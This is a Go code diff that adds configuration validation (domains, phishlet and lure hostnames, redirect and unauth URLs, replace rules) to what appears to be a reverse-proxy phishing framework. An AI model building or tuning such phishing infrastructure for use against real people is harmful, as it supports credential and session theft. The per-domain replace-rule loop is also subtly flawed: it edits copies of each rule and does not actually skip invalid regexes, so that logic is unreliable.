@@ -271,8 +271,171 @@ func NewConfig(cfg_dir string, path string) (*Config, error) {
 		c.lureIds = append(c.lureIds, GenRandomToken())
 	}
 
+	c.validateAndSanitizeConfig()
 	c.cfg.WriteConfig()
 	return c, nil
+}
+
+func (c *Config) validateAndSanitizeConfig() {
+	if c.general.Domain != "" {
+		orig := c.general.Domain
+		c.general.Domain = strings.TrimSpace(c.general.Domain)
+		if !IsValidDomain(c.general.Domain) {
+			log.Error("config: invalid domain in general.domain '%s', cleared - please set valid domain via: config domain <domain>", orig)
+			c.general.Domain = ""
+		} else if orig != c.general.Domain {
+			log.Info("config: general.domain trimmed from '%s' to '%s'", orig, c.general.Domain)
+		}
+	}
+
+	validDomains := []*DomainConfig{}
+	for i, d := range c.domains {
+		if d == nil {
+			continue
+		}
+		origDomain := d.Domain
+		d.Domain = strings.TrimSpace(d.Domain)
+		if d.Domain == "" || !IsValidDomain(d.Domain) {
+			log.Error("config: invalid domain in domains[%d] '%s', skipped", i, origDomain)
+			continue
+		}
+		if d.TargetUrl != "" {
+			d.TargetUrl = strings.TrimSpace(d.TargetUrl)
+			if _, err := url.ParseRequestURI(d.TargetUrl); err != nil {
+				log.Error("config: invalid target_url in domains[%d] '%s' -> '%s', cleared", i, d.Domain, d.TargetUrl)
+				d.TargetUrl = ""
+			}
+		}
+		if d.LurePage != "" {
+			d.LurePage = strings.TrimSpace(d.LurePage)
+		}
+		if d.CertPath != "" {
+			d.CertPath = strings.TrimSpace(d.CertPath)
+		}
+		if d.KeyPath != "" {
+			d.KeyPath = strings.TrimSpace(d.KeyPath)
+		}
+		if d.UnauthUrl != "" {
+			d.UnauthUrl = strings.TrimSpace(d.UnauthUrl)
+			if _, err := url.ParseRequestURI(d.UnauthUrl); err != nil {
+				log.Error("config: invalid unauth_url in domains[%d] '%s' -> '%s', cleared", i, d.Domain, d.UnauthUrl)
+				d.UnauthUrl = ""
+			}
+		}
+		for j, rule := range d.ReplaceRules {
+			rule.Pattern = strings.TrimSpace(rule.Pattern)
+			if rule.Type == "" {
+				rule.Type = "text"
+			}
+			if rule.Type == "regex" && rule.Pattern != "" {
+				if _, err := regexp.Compile(rule.Pattern); err != nil {
+					log.Error("config: invalid regex replace_rule in domains[%d].ReplaceRules[%d] pattern '%s': %v, skipped", i, j, rule.Pattern, err)
+					continue
+				}
+			}
+			if rule.Pattern != "" {
+				d.ReplaceRules = append(d.ReplaceRules[:0], append([]ReplaceRule{}, d.ReplaceRules[:j+1]...)...)
+			}
+		}
+		validDomains = append(validDomains, d)
+	}
+	if len(validDomains) != len(c.domains) {
+		c.domains = validDomains
+	}
+
+	for site, plc := range c.phishletConfig {
+		if plc == nil {
+			delete(c.phishletConfig, site)
+			continue
+		}
+		if plc.Hostname != "" {
+			orig := plc.Hostname
+			plc.Hostname = strings.TrimSpace(plc.Hostname)
+			if !IsValidHostname(plc.Hostname) {
+				log.Error("config: invalid hostname for phishlet '%s' -> '%s', cleared", site, orig)
+				plc.Hostname = ""
+			}
+			if plc.Hostname != "" {
+				suffixOk := (c.general.Domain != "" && (plc.Hostname == c.general.Domain || strings.HasSuffix(plc.Hostname, "."+c.general.Domain)))
+				for _, d := range c.domains {
+					if plc.Hostname == d.Domain || strings.HasSuffix(plc.Hostname, "."+d.Domain) {
+						suffixOk = true
+						break
+					}
+				}
+				if !suffixOk && c.IsAnyDomainSet() {
+					log.Error("config: phishlet '%s' hostname '%s' does not end with any configured base domain, cleared", site, plc.Hostname)
+					plc.Hostname = ""
+				}
+			}
+		}
+		if plc.UnauthUrl != "" {
+			plc.UnauthUrl = strings.TrimSpace(plc.UnauthUrl)
+			if _, err := url.ParseRequestURI(plc.UnauthUrl); err != nil {
+				log.Error("config: invalid unauth_url for phishlet '%s' -> '%s', cleared", site, plc.UnauthUrl)
+				plc.UnauthUrl = ""
+			}
+		}
+	}
+
+	validLures := []*Lure{}
+	for i, l := range c.lures {
+		if l == nil {
+			continue
+		}
+		if l.Hostname != "" {
+			orig := l.Hostname
+			l.Hostname = strings.ToLower(strings.TrimSpace(l.Hostname))
+			if !IsValidHostname(l.Hostname) {
+				log.Error("config: invalid hostname in lures[%d] id='%s' -> '%s', cleared", i, l.Id, orig)
+				l.Hostname = ""
+			}
+			if l.Hostname != "" {
+				suffixOk := (c.general.Domain != "" && (l.Hostname == c.general.Domain || strings.HasSuffix(l.Hostname, "."+c.general.Domain)))
+				for _, d := range c.domains {
+					if l.Hostname == d.Domain || strings.HasSuffix(l.Hostname, "."+d.Domain) {
+						suffixOk = true
+						break
+					}
+				}
+				if !suffixOk && c.IsAnyDomainSet() {
+					log.Error("config: lures[%d] id='%s' hostname '%s' does not end with any configured base domain, cleared", i, l.Id, l.Hostname)
+					l.Hostname = ""
+				}
+			}
+		}
+		if l.Redirector != "" {
+			l.Redirector = strings.TrimSpace(l.Redirector)
+		}
+		if l.RedirectUrl != "" {
+			l.RedirectUrl = strings.TrimSpace(l.RedirectUrl)
+		}
+		validLures = append(validLures, l)
+	}
+	if len(validLures) != len(c.lures) {
+		c.lures = validLures
+	}
+
+	validGlobalRules := []ReplaceRule{}
+	for j, rule := range c.replaceRules {
+		rule.Pattern = strings.TrimSpace(rule.Pattern)
+		if rule.Pattern == "" {
+			continue
+		}
+		if rule.Type == "" {
+			rule.Type = "text"
+		}
+		if rule.Type == "regex" {
+			if _, err := regexp.Compile(rule.Pattern); err != nil {
+				log.Error("config: invalid regex replace_rule (global) index=%d pattern '%s': %v, skipped", j, rule.Pattern, err)
+				continue
+			}
+		}
+		validGlobalRules = append(validGlobalRules, rule)
+	}
+	if len(validGlobalRules) != len(c.replaceRules) {
+		c.replaceRules = validGlobalRules
+	}
 }
 
 func (c *Config) PhishletConfig(site string) *PhishletConfig {
@@ -314,7 +477,7 @@ func (c *Config) SetSiteHostname(site string, hostname string) bool {
 		log.Error("hostname can't be empty")
 		return false
 	}
-	if !isValidHostname(hostname) {
+	if !IsValidHostname(hostname) {
 		log.Error("invalid hostname format '%s': must only contain letters, digits, dots and hyphens, no spaces or special characters", hostname)
 		return false
 	}
@@ -371,7 +534,7 @@ func (c *Config) SetBaseDomain(domain string) bool {
 		log.Error("domain can't be empty")
 		return false
 	}
-	if !isValidDomain(domain) {
+	if !IsValidDomain(domain) {
 		log.Error("invalid domain format '%s': must only contain letters, digits, dots and hyphens, no spaces or special characters", domain)
 		return false
 	}
@@ -382,14 +545,14 @@ func (c *Config) SetBaseDomain(domain string) bool {
 	return true
 }
 
-func isValidDomain(domain string) bool {
+func IsValidDomain(domain string) bool {
 	if len(domain) > 253 {
 		return false
 	}
 	return domainRegexp.MatchString(domain)
 }
 
-func isValidHostname(hostname string) bool {
+func IsValidHostname(hostname string) bool {
 	if len(hostname) > 253 {
 		return false
 	}
@@ -964,7 +1127,7 @@ func (c *Config) AddDomain(domain *DomainConfig) bool {
 		log.Error("domain name can't be empty")
 		return false
 	}
-	if !isValidDomain(domain.Domain) {
+	if !IsValidDomain(domain.Domain) {
 		log.Error("invalid domain format '%s': must only contain letters, digits, dots and hyphens, no spaces or special characters", domain.Domain)
 		return false
 	}
